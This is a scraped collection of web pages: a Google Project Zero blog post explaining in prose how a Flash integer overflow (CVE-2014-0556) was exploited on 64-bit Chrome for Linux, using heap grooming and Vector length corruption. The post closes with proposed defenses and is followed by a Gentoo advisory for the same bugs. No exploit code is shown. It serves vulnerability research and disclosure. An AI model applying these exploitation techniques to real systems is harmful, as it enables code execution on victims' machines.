    [April](https://googleprojectzero.blogspot.com/2020/04/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2020/02/)
    (4)
  + ►
    [January](https://googleprojectzero.blogspot.com/2020/01/)
    (5)

* ►
  [2019](https://googleprojectzero.blogspot.com/2019/)
  (27)
  + ►
    [December](https://googleprojectzero.blogspot.com/2019/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2019/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2019/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2019/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2019/08/)
    (11)
  + ►
    [May](https://googleprojectzero.blogspot.com/2019/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2019/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2019/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2019/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2019/01/)
    (2)

* ►
  [2018](https://googleprojectzero.blogspot.com/2018/)
  (22)
  + ►
    [December](https://googleprojectzero.blogspot.com/2018/12/)
    (7)
  + ►
    [November](https://googleprojectzero.blogspot.com/2018/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2018/10/)
    (4)
  + ►
    [September](https://googleprojectzero.blogspot.com/2018/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2018/08/)
    (3)
  + ►
    [July](https://googleprojectzero.blogspot.com/2018/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2018/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2018/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2018/04/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2018/01/)
    (1)

* ►
  [2017](https://googleprojectzero.blogspot.com/2017/)
  (19)
  + ►
    [December](https://googleprojectzero.blogspot.com/2017/12/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2017/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2017/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2017/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2017/07/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2017/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2017/04/)
    (6)
  + ►
    [March](https://googleprojectzero.blogspot.com/2017/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2017/02/)
    (2)

* ►
  [2016](https://googleprojectzero.blogspot.com/2016/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2016/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2016/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2016/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2016/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2016/08/)
    (1)
  + ►
    [July](https://googleprojectzero.blogspot.com/2016/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2016/06/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2016/03/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2016/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2016/01/)
    (1)

* ►
  [2015](https://googleprojectzero.blogspot.com/2015/)
  (33)
  + ►
    [December](https://googleprojectzero.blogspot.com/2015/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2015/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2015/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2015/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2015/08/)
    (6)
  + ►
    [July](https://googleprojectzero.blogspot.com/2015/07/)
    (5)
  + ►
    [June](https://googleprojectzero.blogspot.com/2015/06/)
    (4)
  + ►
    [May](https://googleprojectzero.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2015/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2015/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2015/02/)
    (3)
  + ►
    [January](https://googleprojectzero.blogspot.com/2015/01/)
    (2)

* ►
  [2014](https://googleprojectzero.blogspot.com/2014/)
  (11)
  + ►
    [December](https://googleprojectzero.blogspot.com/2014/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2014/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2014/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2014/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2014/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2014/07/)
    (3)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from googleprojectzero.blogspot.com_09d3c524_20250125_123236.html ===


# [Project Zero](https://googleprojectzero.blogspot.com/)

News and updates from the Project Zero team at Google

## Tuesday, September 23, 2014

### Exploiting CVE-2014-0556 in Flash

Posted by Chris Evans, Kidnapper of RIP

A couple of weeks ago, Adobe released [security bulletin APSB14-21](http://helpx.adobe.com/security/products/flash-player/apsb14-21.html), including 8 fixes for bugs reported by Project Zero. Full details of these bugs are now public in our bug tracker. Some of the more interesting ones are a [double free in the RTMP protocol](https://code.google.com/p/google-security-research/issues/detail?id=76), or an [integer overflow concatenating strings](https://code.google.com/p/google-security-research/issues/detail?id=78). Again, we’d like to thank Adobe for a response time well ahead of our standard 90-day disclosure deadline.

The focus of this post is an [integer overflow leading to a buffer overflow in an ActionScript API](https://code.google.com/p/google-security-research/issues/detail?id=46).

Prelude
Before we get started, though, it’s worth briefly noting why there is so much value in writing an exploit. Finding and eliminating bugs obviously improves software correctness, but writing exploits is always a significant learning opportunity. Throughout the history of the security industry, there’s a long track record of offense driving defense, leading to technologies such as stack canaries, NX support in processors and ASLR.

Project Zero is not just a bug hunting initiative. We’re doing our part to continue the tradition of practical and public research of exploitation techniques -- and deriving defenses from them. For example, our [glibc defensive patch](https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=52ffbdf25a1100986f4ae27bb0febbe5a722ab25) was accepted as a follow-on from our [glibc exploit](http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html).

The case of this particular exploit starts with some irony on account of my overly hasty initial triage of the bug based on instincts which were later proved wrong by a more in-depth analysis of exploitation opportunities. In the bug history, you can see the claim “almost certainly 64-bit only” (wrong!) and then “does not work in Chrome 64-bit Linux”. We learned not to declare anything as unexploitable in our previous post about [exploiting a subtle condition in glibc](http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html). Therefore, I had to declare shenanigans on myself and tackle the challenge: exploit this bug on Chrome 64-bit Linux.

The bug
The bug is triggered by calling BitmapData.copyPixelsToByteArray() with a reference to a ByteArray that has its position property set very large -- close to 2^32. This results in an integer overflow in 32-bit arithmetic. This occurs even on 64-bit because the relevant positions and length variables are (quite reasonably) stored in 32-bit variables. The code then believes that it can copy the pixels, starting to write them at position, and stay within the bounds of the buffer. Instead, a buffer overflow occurs. On 32-bit, the out-of-bounds write will be written before the start of the buffer because the pointer will wrap. On 64-bit, things are not as kind to the attacker. On a typical 64-bit Linux process setup with a 1MB buffer, the situation will look like this:

… | buffer: 1MB | heap, libs, binary |                 !!

The out-of-bounds write (in red) is at approximately buffer + 4GB. This will not wrap around the massive 64-bit address space, leading to a write way off in unmapped space. Insta-crash. The most obvious way to avoid the crash is to make the buffer massive, almost 4GB, leading to this situation:

… | buffer: 4GB                                      | !! heap, libs, binary |

This is readily exploitable. However, 64-bit Chrome on Linux has a defensive measure where the amount of mapped address space is limited to 4GB. So the large buffer allocation will fail and prevent that particular attack.

The heap groom
We’re going to need a trick to exploit this without slamming into the 4GB address space limit. The breakthrough -- that did not occur to me before attempting to develop an exploit -- comes when we realize that we don’t need to have the address space contiguously mapped. The out-of-bounds write will happily still go ahead even if it “jumps over” a hole in the address space. By having a hole in the address space, perhaps we can usefully trigger the corruption with less than 4GB mapped.

But how do we put this hole where we want it? Looking at how the Flash allocator works using the strace system tool, we see that very large allocations are serviced using unhinted mmap(). The Linux standard algorithm for servicing unhinted mmap() calls is to stack them adjacent and downwards in address space, as long as there isn’t a hole that can satisfy the request. So let’s see what happens when we allocate two 1GB chunks:

… | buffer2: 1GB | buffer1: 1GB | heap, libs, binary |

And the free the first one (a direct munmap() call is seen):

… | buffer2: 1GB |   1GB hole   | heap, libs, binary |

And then allocate a 2GB buffer (too big to fit in the hole):

… | buffer3: 2GB        | buffer2: 1GB |   1GB hole   | !! heap, libs, binary |

Aha! We’ve managed to engineer a situation where we’ve never had more than 4GB of address space mapped at any given moment, and at the end, a corruption at buffer3 + 4GB will land right in a writable region: the heap.

The corruption target
Now that we have a reasonably controlled memory corruption situation, we need to pick something to corrupt. As is pretty standard in modern heap buffer overflow exploitation in a scripting environment, we’re going to try and clobber a length of an array-like object. If we clobber any such length to be larger, we will then be able to read and write arbitrary relative heap memory. Once we’ve achieved such a powerful primitive, it’s essentially game over. Successful exploitation is pretty much assured: defeat ASLR by reading the value of a vtable and then write a new vtable that causes execution redirection to a sequence of opcodes that we choose.

We decide to corrupt a Vector.<uint> buffer object. This is a fairly standard, documented technique. I recommend Haifei Li’s [excellent paper as background reading](http://0xfeedface.org/sites/default/files/smashing_the_heap_with_vector_Li.pdf). Corrupting this buffer object is an obvious target because of three properties it possesses:

* The attacker can choose arbitrary sizes for these objects, meaning there is a lot of control over where in the heap they are placed relative to the pending heap corruption.
* The object starts with a length field, and corrupting it results in arbitrary heap relative read/write being exposed to script.
* The object is resilient to corruption in general. Aside from the length field, there is just a single pointer and trashing this pointer does not affect the ability to use the Vector, or otherwise cause noticeable stability issues during the course of exploitation. (We could even restore its value post-exploitation if we wished.)

To proceed, we simply create many (32) Vector.<uint> objects, all with buffers sized at about 2MB. These typically end up being stacked downwards at the top of the 1GB hole. In reality, the 1GB and 2GB allocations end up being a little larger than expected under the covers. This means that the corruption address of buffer3 + 4GB actually ends up corrupting objects within the 1GB hole instead of after it. This is ideal because we can make sure that only our large buffers are corrupted. In terms of the actual data to write, we just use the default values in an empty BitmapData, which are 0xffffffff (white pixels with a full alpha channel). 0xffffffff is a plenty large enough length to proceed with the exploit!

Proceeding onwards
There is nothing particularly exciting or unique about how the exploit proceeds to demonstrate code execution, so we’ll skip the lengthy explanation here. I’ve made an attempt to fully comment the exploit source code, so if you want to continue to follow along I recommend you read the materials attached to the [public bug](https://code.google.com/p/google-security-research/issues/detail?id=46).

The only part I’d flag as mildly interesting -- because it differs from the previously quoted paper -- is how we get known data at a known heap address. We do it with a Vector.<uint> object again. Each of these is in fact a pair of objects: a script object, which is a fixed sized and contains metadata; and the buffer object which contains the arbitrary data prefixed by the length. The script object forms a distinct pattern in memory and also contains a pointer to the buffer object. By locating any Vector.<uint> script object, we can then use a raw memory edit to change a property of the object. This property change will be visible to ActionScript so we then know which handle corresponds to a buffer at which raw address.

Conclusions, and turning what we’ve learned into generic defenses
Various technologies would have changed the exploitation landscape here, and can now be investigated in more detail:

* Randomized placement of large memory chunks. Non-deterministic placement of large allocations would have broken the heap grooming aspect of the exploit.
* Isolation of Vector.<uint> buffers. As we’ve seen, corruption of these buffers is an extremely dangerous condition. Some of the most recent advances in memory corruption defenses have been [“isolated” or “partitioned” heaps](https://labs.mwrinfosecurity.com/blog/2014/06/20/isolated-heap-friends---object-allocation-hardening-in-web-browsers/). These technologies seem applicable here. (They would need to be applied not just to the Vector buffers, but to the general case: partitioning off read/write objects where the attacker controls both the size and the content.)

Given the open-source nature of the [ActionScript engine](https://github.com/adobe-flash/avmplus), and the open-source nature of some [potentially helpful technologies](https://chromium.googlesource.com/chromium/blink/%2B/master/Source/wtf/PartitionAlloc.h), a prototype of a generic defense is now on the Project Zero TODO list!

Posted by
Anonymous

at

[12:31 AM](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=304895122341465676&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=pinterest "Share to Pinterest")

#### 3 comments:

1. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Chris Evans](https://www.blogger.com/profile/01004765479735675808)[September 23, 2014 at 12:58 PM](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html?showComment=1411502303610#c6488753986062327557)

   Thanks, I'll have a look a Vector.Object again. I didn't see the pointer you describe but I will re-check.

   Any links to the longjmp trick? I did consider it but it does not restore "caller saved" registers like RDI, RSI.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=4838136820032157985&postID=6488753986062327557)Replies
   Reply
2. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Chris Evans](https://www.blogger.com/profile/01004765479735675808)[September 23, 2014 at 12:59 PM](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html?showComment=1411502377892#c3764361633065299360)

   Also, I think the data in Vector.Object is not raw. Isn't it tagged pointers? If so, the read/write data won't be arbitrary?

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=4838136820032157985&postID=3764361633065299360)Replies
   Reply
3. ![](//www.blogger.com/img/blogger_logo_round_35.png)[combabo](https://www.blogger.com/profile/11790342916526462869)[September 27, 2014 at 6:54 PM](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html?showComment=1411869253932#c594656828254722263)

   This comment has been removed by the author.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=4838136820032157985&postID=594656828254722263)Replies
   Reply

Add commentLoad more...

[Newer Post](https://googleprojectzero.blogspot.com/2014/10/more-mac-os-x-and-iphone-sandbox.html "Newer Post")

[Older Post](https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html "Older Post")

[Home](https://googleprojectzero.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](https://googleprojectzero.blogspot.com/feeds/304895122341465676/comments/default)

## Search This Blog

|  |  |
| --- | --- |

## Pages

* [About Project Zero](https://googleprojectzero.blogspot.com/p/about-project-zero.html)
* [Working at Project Zero](https://googleprojectzero.blogspot.com/p/working-at-project-zero.html)
* [0day "In the Wild"](https://googleprojectzero.blogspot.com/p/0day.html)
* [0day Exploit Root Cause Analyses](https://googleprojectzero.github.io/0days-in-the-wild/rca.html)
* [Vulnerability Disclosure FAQ](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html)

## Archives

* ►
  [2024](https://googleprojectzero.blogspot.com/2024/)
  (12)
  + ►
    [December](https://googleprojectzero.blogspot.com/2024/12/)
    (3)
  + ►
    [November](https://googleprojectzero.blogspot.com/2024/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2024/10/)
    (2)
  + ►
    [June](https://googleprojectzero.blogspot.com/2024/06/)
    (3)
  + ►
    [April](https://googleprojectzero.blogspot.com/2024/04/)
    (2)

* ►
  [2023](https://googleprojectzero.blogspot.com/2023/)
  (11)
  + ►
    [November](https://googleprojectzero.blogspot.com/2023/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2023/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2023/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2023/08/)
    (4)
  + ►
    [April](https://googleprojectzero.blogspot.com/2023/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2023/03/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2023/01/)
    (2)

* ►
  [2022](https://googleprojectzero.blogspot.com/2022/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2022/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2022/11/)
    (3)
  + ►
    [October](https://googleprojectzero.blogspot.com/2022/10/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2022/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2022/06/)
    (3)
  + ►
    [May](https://googleprojectzero.blogspot.com/2022/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2022/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2022/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2022/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2022/01/)
    (1)

* ►
  [2021](https://googleprojectzero.blogspot.com/2021/)
  (24)
  + ►
    [December](https://googleprojectzero.blogspot.com/2021/12/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2021/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2021/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2021/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2021/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2021/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2021/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2021/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2021/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2021/01/)
    (10)

* ►
  [2020](https://googleprojectzero.blogspot.com/2020/)
  (36)
  + ►
    [December](https://googleprojectzero.blogspot.com/2020/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2020/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2020/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2020/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2020/08/)
    (5)
  + ►
    [July](https://googleprojectzero.blogspot.com/2020/07/)
    (8)
  + ►
    [June](https://googleprojectzero.blogspot.com/2020/06/)
    (2)
  + ►
    [April](https://googleprojectzero.blogspot.com/2020/04/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2020/02/)
    (4)
  + ►
    [January](https://googleprojectzero.blogspot.com/2020/01/)
    (5)

* ►
  [2019](https://googleprojectzero.blogspot.com/2019/)
  (27)
  + ►
    [December](https://googleprojectzero.blogspot.com/2019/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2019/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2019/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2019/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2019/08/)
    (11)
  + ►
    [May](https://googleprojectzero.blogspot.com/2019/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2019/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2019/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2019/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2019/01/)
    (2)

* ►
  [2018](https://googleprojectzero.blogspot.com/2018/)
  (22)
  + ►
    [December](https://googleprojectzero.blogspot.com/2018/12/)
    (7)
  + ►
    [November](https://googleprojectzero.blogspot.com/2018/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2018/10/)
    (4)
  + ►
    [September](https://googleprojectzero.blogspot.com/2018/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2018/08/)
    (3)
  + ►
    [July](https://googleprojectzero.blogspot.com/2018/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2018/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2018/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2018/04/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2018/01/)
    (1)

* ►
  [2017](https://googleprojectzero.blogspot.com/2017/)
  (19)
  + ►
    [December](https://googleprojectzero.blogspot.com/2017/12/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2017/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2017/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2017/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2017/07/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2017/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2017/04/)
    (6)
  + ►
    [March](https://googleprojectzero.blogspot.com/2017/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2017/02/)
    (2)

* ►
  [2016](https://googleprojectzero.blogspot.com/2016/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2016/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2016/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2016/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2016/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2016/08/)
    (1)
  + ►
    [July](https://googleprojectzero.blogspot.com/2016/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2016/06/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2016/03/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2016/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2016/01/)
    (1)

* ►
  [2015](https://googleprojectzero.blogspot.com/2015/)
  (33)
  + ►
    [December](https://googleprojectzero.blogspot.com/2015/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2015/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2015/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2015/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2015/08/)
    (6)
  + ►
    [July](https://googleprojectzero.blogspot.com/2015/07/)
    (5)
  + ►
    [June](https://googleprojectzero.blogspot.com/2015/06/)
    (4)
  + ►
    [May](https://googleprojectzero.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2015/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2015/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2015/02/)
    (3)
  + ►
    [January](https://googleprojectzero.blogspot.com/2015/01/)
    (2)

* ▼
  [2014](https://googleprojectzero.blogspot.com/2014/)
  (11)
  + ►
    [December](https://googleprojectzero.blogspot.com/2014/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2014/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2014/10/)
    (2)
  + ▼
    [September](https://googleprojectzero.blogspot.com/2014/09/)
    (1)
    - [Exploiting CVE-2014-0556 in Flash](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html)
  + ►
    [August](https://googleprojectzero.blogspot.com/2014/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2014/07/)
    (3)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from security.gentoo.org_c65ff8a4_20250125_123248.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Adobe Flash Player: Multiple vulnerabilities — GLSA **201409-05**

Multiple vulnerabilities have been found in Adobe Flash Player, the
worst of which allows remote attackers to execute arbitrary code.

### Affected packages

| Package | **www-plugins/adobe-flash** on all architectures |
| --- | --- |
| Affected versions | < **11.2.202.406** |
| Unaffected versions | >= **11.2.202.406** |

### Background

The Adobe Flash Player is a renderer for the SWF file format, which is
commonly used to provide interactive websites.

### Description

Multiple vulnerabilities have been discovered in Adobe Flash Player.
Please review the CVE identifiers referenced below for details.

### Impact

A remote attacker could possibly execute arbitrary code with the
privileges of the process or bypass security restrictions.

### Workaround

There is no known workaround at this time.

### Resolution

All Adobe Flash Player users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose
 ">=www-plugins/adobe-flash-11.2.202.406"

```
### References

* [CVE-2014-0547](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0547)
* [CVE-2014-0548](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0548)
* [CVE-2014-0549](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0549)
* [CVE-2014-0550](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0550)
* [CVE-2014-0551](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0551)
* [CVE-2014-0552](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0552)
* [CVE-2014-0553](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0553)
* [CVE-2014-0554](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0554)
* [CVE-2014-0555](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0555)
* [CVE-2014-0556](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0556)
* [CVE-2014-0557](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0557)
* [CVE-2014-0559](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0559)

**Release date**

September 19, 2014

**Latest revision**

September 19, 2014: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [522448](https://bugs.gentoo.org/show_bug.cgi?id=522448)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**


